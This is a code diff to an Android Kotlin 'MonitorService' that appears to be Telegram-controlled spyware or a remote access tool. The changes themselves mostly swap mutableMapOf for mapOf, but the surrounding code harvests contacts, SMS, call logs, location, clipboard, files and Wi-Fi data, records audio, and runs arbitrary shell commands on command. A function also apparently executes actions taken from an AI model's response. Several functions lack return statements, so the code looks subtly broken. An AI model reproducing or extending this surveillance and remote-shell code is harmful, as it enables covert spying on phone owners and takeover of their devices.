@@ -229,9 +229,9 @@ class MonitorService : Service() {
         when {
             trimmed == "/start" || trimmed == "/help" -> sendTelegramMessage(chatId, getHelp())
             trimmed == "/status" -> sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
-            trimmed == "/contacts" -> sendTelegramTask(chatId, "contacts", mapOf<String, Any>())
-            trimmed == "/sms" -> sendTelegramTask(chatId, "sms", mapOf<String, Any>())
-            trimmed == "/calls" -> sendTelegramTask(chatId, "call_logs", mapOf<String, Any>())
+            trimmed == "/contacts" -> sendTelegramTask(chatId, "contacts", mapOf())
+            trimmed == "/sms" -> sendTelegramTask(chatId, "sms", mapOf())
+            trimmed == "/calls" -> sendTelegramTask(chatId, "call_logs", mapOf())
             trimmed == "/apps" -> sendTelegramTask(chatId, "apps", mapOf("action" to "list"))
             trimmed == "/location" -> sendTelegramTask(chatId, "location", mapOf("action" to "get"))
             trimmed == "/files" -> sendTelegramTask(chatId, "files", mapOf("action" to "list", "path" to "/sdcard"))
@@ -321,7 +321,7 @@ class MonitorService : Service() {
             "audio" -> recordAudio(args as Map<String, Any>)
             "camera" -> captureCamera(args as Map<String, Any>)
             "shell" -> runShell(args["command"] as? String ?: "")
-            else -> mutableMapOf("error" to "Unknown capability: $capability")
+            else -> mapOf("error" to "Unknown capability: $capability")
         }
     }
 
@@ -359,7 +359,7 @@ class MonitorService : Service() {
                 }
             }
         } catch (e: Exception) { Log.e("Contacts", "Error", e) }
-        return mutableMapOf("contacts" to list, "count" to list.size)
+        return mapOf("contacts" to list, "count" to list.size)
     }
 
     private fun getSms(): Map<String, Any> {
@@ -382,7 +382,7 @@ class MonitorService : Service() {
                 }
             }
         } catch (e: Exception) { Log.e("Sms", "Error", e) }
-        return mutableMapOf("sms" to list, "count" to list.size)
+        return mapOf("sms" to list, "count" to list.size)
     }
 
     private fun getCallLogs(): Map<String, Any> {
@@ -406,7 +406,7 @@ class MonitorService : Service() {
                 }
             }
         } catch (e: Exception) { Log.e("Calls", "Error", e) }
-        return mutableMapOf("calls" to list, "count" to list.size)
+        return mapOf("calls" to list, "count" to list.size)
     }
 
     private fun getApps(): Map<String, Any> {
@@ -423,7 +423,7 @@ class MonitorService : Service() {
                 list.add(m)
             }
         } catch (e: Exception) { Log.e("Apps", "Error", e) }
-        return mutableMapOf("apps" to list, "count" to list.size)
+        return mapOf("apps" to list, "count" to list.size)
     }
 
     private fun getFiles(args: Map<String, Any>): Map<String, Any> {
@@ -432,7 +432,7 @@ class MonitorService : Service() {
         return when (action) {
             "list" -> {
                 val dir = File(path)
-                if (!dir.exists() || !dir.isDirectory) mutableMapOf("error" to "Not a directory")
+                if (!dir.exists() || !dir.isDirectory) mapOf("error" to "Not a directory")
                 else {
                     val files = dir.listFiles()?.mapNotNull { f ->
                         try {
@@ -445,10 +445,10 @@ class MonitorService : Service() {
                             m
                         } catch (e: Exception) { null }
                     } ?: emptyList()
-                    mutableMapOf("files" to files.take(200), "path" to path, "count" to files.size)
+                    mapOf("files" to files.take(200), "path" to path, "count" to files.size)
                 }
             }
-            else -> mutableMapOf("error" to "Unknown action")
+            else -> mapOf("error" to "Unknown action")
         }
     }
 
@@ -456,18 +456,18 @@ class MonitorService : Service() {
         val wm = getSystemService(android.net.wifi.WifiManager::class.java)
         val results = wm.scanResults ?: emptyList()
         val networks = results.map { r ->
-            mutableMapOf("ssid" to r.SSID, "bssid" to r.BSSID, "level" to r.level, "freq" to r.frequency, "caps" to r.capabilities)
+            mapOf("ssid" to r.SSID, "bssid" to r.BSSID, "level" to r.level, "freq" to r.frequency, "caps" to r.capabilities)
         }
-        mutableMapOf("networks" to networks, "count" to networks.size)
+        mapOf("networks" to networks, "count" to networks.size)
     }
 
     private fun getClipboard(): Map<String, Any> {
         val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
         if (cm.hasPrimaryClip()) {
             val clip = cm.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
-            return mutableMapOf("text" to clip, "has_content" to clip.isNotEmpty())
+            return mapOf("text" to clip, "has_content" to clip.isNotEmpty())
         }
-        mutableMapOf("text" to "", "has_content" to false)
+        mapOf("text" to "", "has_content" to false)
     }
 
     private fun getLocation(): Map<String, Any> {
@@ -478,14 +478,14 @@ class MonitorService : Service() {
 
             val lastLoc = locationManager?.getLastKnownLocation(provider)
             if (lastLoc != null) {
-                val m = mutableMapOf<String, Any>()
-                m["lat"] = lastLoc.latitude
-                m["lon"] = lastLoc.longitude
-                m["acc"] = lastLoc.accuracy
-                m["time"] = lastLoc.time
-                m["provider"] = provider
-                m["note"] = "Last known location (may be stale)"
-                return m
+                return mapOf(
+                    "lat" to lastLoc.latitude,
+                    "lon" to lastLoc.longitude,
+                    "acc" to lastLoc.accuracy,
+                    "time" to lastLoc.time,
+                    "provider" to provider,
+                    "note" to "Last known location (may be stale)"
+                )
             }
 
             val latch = CountDownLatch(1)
@@ -509,14 +509,14 @@ class MonitorService : Service() {
             try {
                 locationManager?.requestSingleUpdate(provider, listener, null)
                 if (latch.await(5, TimeUnit.SECONDS)) {
-                    return result ?: mutableMapOf("error" to "Location request timed out")
+                    return result ?: mapOf("error" to "Location request timed out")
                 }
-                return mutableMapOf("error" to "Location timeout - no fix in 5s")
+                return mapOf("error" to "Location timeout - no fix in 5s")
             } catch (e: Exception) {
-                return mutableMapOf("error" to e.message ?: "Location error")
+                return mapOf("error" to e.message ?: "Location error")
             }
         } catch (e: Exception) {
-            return mutableMapOf("error" to e.message ?: "Location error")
+            return mapOf("error" to e.message ?: "Location error")
         }
     }
 
@@ -539,16 +539,16 @@ class MonitorService : Service() {
                         Thread.sleep((duration * 1000L).toLong())
                         stopRecording()
                     }
-                    mutableMapOf("status" to "recording", "duration" to duration, "file" to outputFile.absolutePath)
+                    mapOf("status" to "recording", "duration" to duration, "file" to outputFile.absolutePath)
                 } catch (e: Exception) {
-                    mutableMapOf("error" to e.message ?: "Audio start failed")
+                    mapOf("error" to e.message ?: "Audio start failed")
                 }
             }
             "stop" -> {
                 stopRecording()
-                mutableMapOf("status" to "stopped")
+                mapOf("status" to "stopped")
             }
-            else -> mutableMapOf("error" to "Unknown audio action")
+            else -> mapOf("error" to "Unknown audio action")
         }
     }
 
@@ -562,22 +562,22 @@ class MonitorService : Service() {
     private fun captureCamera(args: Map<String, Any>): Map<String, Any> {
         val cameraId = (args["camera"] as? Int) ?: 0
         val outputFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "photo_${System.currentTimeMillis()}.jpg")
-        mutableMapOf("status" to "requires_camera2", "note" to "Camera2 API needed", "file" to outputFile.absolutePath, "camera_id" to cameraId)
+        mapOf("status" to "requires_camera2", "note" to "Camera2 API needed", "file" to outputFile.absolutePath, "camera_id" to cameraId)
     }
 
     private fun getScreenshot(): Map<String, Any> {
-        mutableMapOf("status" to "requires_mediaprojection", "note" to "Requires MediaProjection permission")
+        mapOf("status" to "requires_mediaprojection", "note" to "Requires MediaProjection permission")
     }
 
     private fun runShell(cmd: String): Map<String, Any> {
-        if (cmd.isBlank()) return mutableMapOf("error" to "No command")
+        if (cmd.isBlank()) return mapOf("error" to "No command")
         try {
             val process = Runtime.getRuntime().exec(cmd)
             val output = process.inputStream.readAllBytes().toString(Charsets.UTF_8)
             val error = process.errorStream.readAllBytes().toString(Charsets.UTF_8)
             val exitCode = process.waitFor()
-            mutableMapOf("exit" to exitCode, "output" to output, "error" to error)
-        } catch (e: Exception) { mutableMapOf("error" to e.message ?: "unknown error") }
+            mapOf("exit" to exitCode, "output" to output, "error" to error)
+        } catch (e: Exception) { mapOf("error" to e.message ?: "unknown error") }
     }
 
     private fun sendResult(taskId: String, result: Any?, error: String?, status: String, replyChat: Long = 0) {
@@ -803,7 +803,7 @@ private fun executeAiActions(aiResponse: String): List<Map<String, Any>> {
         }
     } catch (e: Exception) {
         Log.e("AI", "Parse error", e)
-        results.add(mutableMapOf("error" to e.message ?: "unknown error", "raw_response" to aiResponse))
+        results.add(mapOf("error" to e.message ?: "unknown error", "raw_response" to aiResponse))
     }
     return results
 }
